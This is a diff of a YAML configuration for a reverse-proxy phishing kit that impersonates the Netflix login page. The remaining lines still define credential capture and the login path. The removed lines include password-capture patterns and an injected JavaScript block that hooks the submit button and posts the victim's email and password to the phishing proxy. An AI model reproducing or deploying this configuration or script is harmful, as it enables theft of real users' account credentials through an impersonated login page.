@@ -28,9 +28,6 @@ credentials:
 
 force_post:
   - path: '/login'
-    search:
-      - {key: 'userLoginId', search: '.*'}
-      - {key: 'password', search: '.*'}
     force:
       - {key: 'rememberMe', value: 'true'}
     type: 'post'
@@ -39,24 +36,3 @@ login:
   domain: 'www.netflix.com'
   path: '/login?nextpage=https%3A%2F%2Fwww.netflix.com%2Femail'
 
-js_inject:
-  - trigger_domains: ["www.netflix.com"]
-    trigger_paths: ["/login"]
-    trigger_params: []
-    script: |  
-      function onclickListener(){
-        var submit = document.querySelectorAll('button[type="submit"]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        submit.addEventListener("click", sendPass);
-        return;
-      }
-      function sendPass(){
-        var email = document.getElementsByName("userLoginId")[0].value;
-        var password = document.getElementsByName("password")[0].value;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/login', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("email="+encodeURIComponent(email)+"&password="+encodeURIComponent(password));
-        return;
-      }
-      setTimeout(function(){ onclickListener(); }, 1000); 
